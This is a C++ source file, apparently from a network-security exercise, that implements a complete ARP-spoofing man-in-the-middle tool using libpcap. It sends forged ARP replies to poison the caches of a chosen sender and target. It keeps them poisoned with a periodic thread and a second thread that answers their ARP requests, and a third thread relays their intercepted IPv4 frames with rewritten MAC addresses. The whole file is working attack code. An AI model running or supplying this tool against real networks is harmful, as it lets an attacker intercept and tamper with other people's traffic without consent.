#include <chrono>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <string>
#include <thread>

#include <sys/ioctl.h>
#include <unistd.h>

#include <net/if.h>
#include <netinet/in.h>

#include <pcap.h>

#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "spoof.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct Ipv4Hdr {
    uint8_t ver_ihl;
    uint8_t tos;
    uint16_t total_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t checksum;
    uint32_t src_ip;
    uint32_t dst_ip;
};
#pragma pack(pop)

// Get Interface Mac address && Ip Address
static bool get_interface_mac_ip(const char* interface_name, IpMac* interface_mac_ip) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        std::perror("Failed to create socket");
        return false;
    }

    struct ifreq ifr;
    std::memset(&ifr, 0, sizeof(ifr));
    std::strncpy(ifr.ifr_name, interface_name, IFNAMSIZ - 1);

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        std::perror("Failed to get MAC address");
        close(sockfd);
        return false;
    }
    interface_mac_ip->mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        std::perror("Failed to get IP address");
        close(sockfd);
        return false;
    }
    interface_mac_ip->ip = Ip(ntohl(reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr)->sin_addr.s_addr));

    close(sockfd);
    return true;
}

// Get Other Mac Address
static bool get_other_mac(pcap_t* pcap, IpMac* interface_mac_ip, IpMac* other_mac_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = interface_mac_ip->mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
    packet.arp_.pro_  = htons(EthHdr::Ip4);
    packet.arp_.hln_  = Mac::Size;
    packet.arp_.pln_  = Ip::Size;
    packet.arp_.op_   = htons(ArpHdr::Request);

    packet.arp_.smac_ = interface_mac_ip->mac;
    packet.arp_.sip_  = htonl(interface_mac_ip->ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_  = htonl(other_mac_ip->ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        std::fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return false;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* pkt;
        int r = pcap_next_ex(pcap, &header, &pkt);
        if (r == 0) continue;
        if (r == PCAP_ERROR || r == PCAP_ERROR_BREAK) {
            std::printf("pcap_next_ex return %d(%s)\n", r, pcap_geterr(pcap));
            break;
        }
        auto* ethHdr = reinterpret_cast<EthHdr const*>(pkt);
        auto* arpHdr = reinterpret_cast<ArpHdr const*>(pkt + sizeof(EthHdr));

        if ((ethHdr->type_ == htons(EthHdr::Arp)) &&
            (arpHdr->op_ == htons(ArpHdr::Reply)) &&
            (other_mac_ip->ip == Ip(ntohl(static_cast<uint32_t>(arpHdr->sip_))))) 
        {
            other_mac_ip->mac = Mac(arpHdr->smac_);
            return true;
        }
    }
    return false;
}

// Infection Arp
static bool infect_arp(pcap_t* pcap, IpMac* interface_mac_ip, IpMac* sender_ip_mac, IpMac* target_ip_mac) {
    EthArpPacket packet;

    packet.eth_.dmac_ = sender_ip_mac->mac;
    packet.eth_.smac_ = interface_mac_ip->mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
    packet.arp_.pro_  = htons(EthHdr::Ip4);
    packet.arp_.hln_  = Mac::Size;
    packet.arp_.pln_  = Ip::Size;
    packet.arp_.op_   = htons(ArpHdr::Reply);
    packet.arp_.smac_ = interface_mac_ip->mac;
    packet.arp_.sip_  = htonl(target_ip_mac->ip);
    packet.arp_.tmac_ = sender_ip_mac->mac;
    packet.arp_.tip_  = htonl(sender_ip_mac->ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        std::fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return false;
    }

    return true;
}

// Repeat Infection Arp
static void repeat_infect_arp(pcap_t* pcap, IpMac* interface_mac_ip, IpMac* sender_ip_mac, IpMac* target_ip_mac) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(100));
        infect_arp(pcap, interface_mac_ip, sender_ip_mac, target_ip_mac);
        infect_arp(pcap, interface_mac_ip, target_ip_mac, sender_ip_mac);
    }
}

// Reflect Infection Arp
static void reflect_infect_arp(pcap_t* pcap, IpMac* interface_mac_ip, IpMac* sender_ip_mac, IpMac* target_ip_mac) {
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* pkt;
        int r = pcap_next_ex(pcap, &header, &pkt);
        if (r == 0) continue;
        if (r == PCAP_ERROR || r == PCAP_ERROR_BREAK) {
            std::printf("pcap_next_ex return %d(%s)\n", r, pcap_geterr(pcap));
            break;
        }
        auto* ethHdr = reinterpret_cast<EthHdr const*>(pkt);
        auto* arpHdr = reinterpret_cast<ArpHdr const*>(pkt + sizeof(EthHdr));

        // sender -> target
        if ((ethHdr->type_ == htons(EthHdr::Arp)) &&
            (arpHdr->op_ == htons(ArpHdr::Request)) &&
            (ethHdr->smac_ == sender_ip_mac->mac) &&
            (Ip(ntohl(static_cast<uint32_t>(arpHdr->tip_))) == target_ip_mac->ip)) 
        {
            infect_arp(pcap, interface_mac_ip, sender_ip_mac, target_ip_mac);
        }
        // target -> sender
        else if ((ethHdr->type_ == htons(EthHdr::Arp)) &&
                 (arpHdr->op_ == htons(ArpHdr::Request)) &&
                 (ethHdr->smac_ == target_ip_mac->mac) &&
                 (Ip(ntohl(static_cast<uint32_t>(arpHdr->tip_))) == sender_ip_mac->ip)) 
        {
            infect_arp(pcap, interface_mac_ip, target_ip_mac, sender_ip_mac);
        }
    }
}

// Change Mac Address && Forward Packet
static void packet_relay(pcap_t* pcap, IpMac* interface_mac_ip, IpMac* sender_ip_mac, IpMac* target_ip_mac) {
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* pkt;
        int r = pcap_next_ex(pcap, &header, &pkt);
        if (r == 0) continue;
        if (r == PCAP_ERROR || r == PCAP_ERROR_BREAK) {
            std::printf("pcap_next_ex return %d(%s)\n", r, pcap_geterr(pcap));
            break;
        }

        u_char* tampered = static_cast<u_char*>(std::malloc(header->caplen));
        if (!tampered) continue;
        std::memcpy(tampered, pkt, header->caplen);

        auto* ethHdr  = reinterpret_cast<EthHdr*>(tampered);

        if ((ethHdr->type_ == htons(EthHdr::Ip4)) && (ethHdr->smac_ == sender_ip_mac->mac)) {
            ethHdr->dmac_ = Mac(target_ip_mac->mac);
            ethHdr->smac_ = Mac(interface_mac_ip->mac);
            pcap_sendpacket(pcap, tampered, header->caplen);
        }
        else if ((ethHdr->type_ == htons(EthHdr::Ip4)) && (ethHdr->smac_ == target_ip_mac->mac)) {
            ethHdr->dmac_ = Mac(sender_ip_mac->mac);
            ethHdr->smac_ = Mac(interface_mac_ip->mac);
            pcap_sendpacket(pcap, tampered, header->caplen);
        }

        std::free(tampered);
    }
}

// Arp Spoofing with Use Thread
bool arp_spoof(const char* interface_name, const char* senderIp, const char* targetIp) {
    char errbuf1[PCAP_ERRBUF_SIZE];
    pcap_t* pcap1 = pcap_open_live(interface_name, BUFSIZ, 1, 1, errbuf1);
    if (pcap1 == nullptr) {
        std::fprintf(stderr, "couldn't open device %s(%s)\n", interface_name, errbuf1);
        return false;
    }

    char errbuf2[PCAP_ERRBUF_SIZE];
    pcap_t* pcap2 = pcap_open_live(interface_name, BUFSIZ, 1, 1, errbuf2);
    if (pcap2 == nullptr) {
        std::fprintf(stderr, "couldn't open device %s(%s)\n", interface_name, errbuf2);
        pcap_close(pcap1);
        return false;
    }

    char errbuf3[PCAP_ERRBUF_SIZE];
    pcap_t* pcap3 = pcap_open_live(interface_name, BUFSIZ, 1, 1, errbuf3);
    if (pcap3 == nullptr) {
        std::fprintf(stderr, "couldn't open device %s(%s)\n", interface_name, errbuf3);
        pcap_close(pcap1);
        pcap_close(pcap2);
        return false;
    }

    IpMac myIpMac{};
    IpMac senderIpMac{};
    IpMac targetIpMac{};

    if (!get_interface_mac_ip(interface_name, &myIpMac)) {
        pcap_close(pcap1); pcap_close(pcap2); pcap_close(pcap3);
        return false;
    }

    senderIpMac.ip = Ip(senderIp);
    if (!get_other_mac(pcap1, &myIpMac, &senderIpMac)) {
        pcap_close(pcap1); pcap_close(pcap2); pcap_close(pcap3);
        return false;
    }

    targetIpMac.ip = Ip(targetIp);
    if (!get_other_mac(pcap1, &myIpMac, &targetIpMac)) {
        pcap_close(pcap1); pcap_close(pcap2); pcap_close(pcap3);
        return false;
    }

    // 초기 감염
    infect_arp(pcap1, &myIpMac, &senderIpMac, &targetIpMac);
    infect_arp(pcap1, &myIpMac, &targetIpMac, &senderIpMac);

    // 스레드 시작
    std::thread t1(repeat_infect_arp, pcap1, &myIpMac, &senderIpMac, &targetIpMac);
    std::thread t2(reflect_infect_arp, pcap2, &myIpMac, &senderIpMac, &targetIpMac);
    std::thread t3(packet_relay,       pcap3, &myIpMac, &senderIpMac, &targetIpMac);

    t1.join();
    t2.join();
    t3.join();

    pcap_close(pcap1);
    pcap_close(pcap2);
    pcap_close(pcap3);
    return true;
}
